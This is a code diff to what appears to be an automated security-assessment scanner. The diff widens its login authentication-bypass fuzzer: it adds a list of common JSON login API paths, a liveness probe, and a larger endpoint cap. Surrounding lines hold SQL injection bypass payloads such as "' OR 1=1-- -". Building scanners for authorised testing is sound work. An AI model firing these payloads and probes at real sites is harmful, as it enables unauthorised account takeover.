@@ -34,6 +34,12 @@ _LOGIN_MARK = re.compile(r'type=["\']?password|name=["\']?password|"(?:invalid|i
 # username field, password field — tried in order when the real names are unknown
 _USER_FIELDS = ("username", "email", "user", "login", "userid", "user_name")
 _PASS_FIELDS = ("password", "pass", "passwd", "pwd")
+# well-known JSON login APIs — the real login is usually an XHR the crawler never records,
+# so probe these directly (a cheap liveness check skips the ones that 404 or serve the shell)
+_API_LOGIN_PATHS = ("/rest/user/login", "/api/login", "/api/auth/login", "/api/v1/auth/login",
+                    "/api/v1/login", "/api/sessions", "/api/session", "/auth/login",
+                    "/users/login", "/user/login", "/login", "/signin", "/session",
+                    "/sessions", "/oauth/token", "/account/login")
 
 _SQLI_USERS = ("' OR 1=1-- -", "admin'-- -", "' OR '1'='1'-- -", '" OR "1"="1',
                "' OR 1=1#", "') OR ('1'='1'-- -", "admin' #")
@@ -105,23 +111,29 @@ def _urlencode(d: dict) -> str:
     return urlencode(d)
 
 
-def _login_targets(inventory, login_form) -> list[dict]:
-    """A form login (from credpage) plus any login-shaped endpoints seen in recon."""
+def _login_targets(inventory, login_form, target=None) -> list[dict]:
+    """A form login (from credpage), the well-known JSON login APIs (the real login is often an
+    XHR that never lands in the crawl), plus any login-shaped endpoints seen in recon."""
     targets, seen = [], set()
+
+    def _add(url, kind, uf=None, pf=None, page=None):
+        if url and url not in seen:
+            seen.add(url)
+            targets.append({"url": url, "kind": kind, "user_field": uf,
+                            "pass_field": pf, "page": page})
+
     if login_form and login_form.get("url"):
-        u = login_form.get("action") or login_form["url"]
-        targets.append({"url": u, "kind": "form",
-                        "user_field": login_form.get("user_field"),
-                        "pass_field": login_form.get("pass_field"),
-                        "page": login_form["url"]})
-        seen.add(u)
+        _add(login_form.get("action") or login_form["url"], "form",
+             login_form.get("user_field"), login_form.get("pass_field"), login_form["url"])
+    if target:
+        from urllib.parse import urlsplit
+        u = urlsplit(target)
+        origin = f"{u.scheme}://{u.netloc}"
+        for pth in _API_LOGIN_PATHS:
+            _add(origin + pth, "api")
     for it in inventory or []:
-        url = it.get("url") or ""
-        if not url or url in seen or not _LOGIN_PATH.search(url):
-            continue
-        seen.add(url)
-        targets.append({"url": url, "kind": "api", "user_field": None,
-                        "pass_field": None, "page": None})
+        if _LOGIN_PATH.search(it.get("url") or ""):
+            _add(it["url"], "api")
     return targets
 
 
@@ -153,7 +165,7 @@ def _file(assessment_id, url, kind, payload_desc, gained, evidence):
 
 
 def login_authbypass_scan(assessment_id, inventory, sandbox, target, session_headers=None,
-                          log: Callable[[str], None] = lambda m: None, cap: int = 4) -> int:
+                          log: Callable[[str], None] = lambda m: None, cap: int = 12) -> int:
     """Fuzz the login endpoint(s) for SQL / NoSQL authentication bypass. Returns findings filed."""
     if sandbox is None:
         return 0
@@ -167,7 +179,7 @@ def login_authbypass_scan(assessment_id, inventory, sandbox, target, session_hea
     except Exception:
         login_form = None
 
-    targets = _login_targets(inventory, login_form)[:cap]
+    targets = _login_targets(inventory, login_form, target)[:cap]
     if not targets:
         return 0
     log(f"auth-bypass: fuzzing {len(targets)} login endpoint(s) for SQL/NoSQL bypass")
@@ -194,6 +206,16 @@ def _field_pairs(t) -> list[tuple[str, str]]:
 
 def _probe_one(assessment_id, t, sandbox, log) -> bool:
     url, kind = t["url"], t["kind"]
+
+    # cheap liveness: a real JSON login API answers a bad login with a non-HTML error; skip a
+    # candidate path that 404/405s or just serves the SPA shell, so many paths stay affordable.
+    if kind == "api":
+        probe = _req(sandbox, "POST", url, headers={"Content-Type": "application/json"},
+                     body=_json.dumps({"email": "owlprobe", "password": "owlprobe"}))
+        st = int(probe.get("status") or 0)
+        low = (probe.get("body") or "").lower()
+        if st in (0, 404, 405, 501) or "<html" in low or "<app-root" in low:
+            return False
 
     # CSRF/hidden fields + session cookie for a server-rendered form
     hidden, cookie = {}, None
